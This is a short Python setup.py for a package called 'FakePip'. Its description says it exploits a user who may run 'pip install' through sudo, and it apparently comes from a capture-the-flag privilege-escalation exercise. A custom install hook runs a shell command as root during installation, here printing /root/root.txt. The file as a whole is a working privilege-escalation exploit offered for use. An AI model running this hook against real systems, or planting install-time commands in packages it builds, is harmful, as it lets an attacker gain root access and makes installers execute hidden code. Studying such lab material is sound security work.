from setuptools import setup
from setuptools.command.install import install
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        os.system('cat /root/root.txt')

setup(name='FakePip',
      version='0.0.1',
      description='This will exploit a sudoer able to /usr/bin/pip install *',
      url='https://github.com/0x00-0x00/fakepip',
      author='zc00l',
      author_email='andre.marques@esecurity.com.br',
      license='MIT',
      zip_safe=False,
cmdclass={'install':CustomInstall})
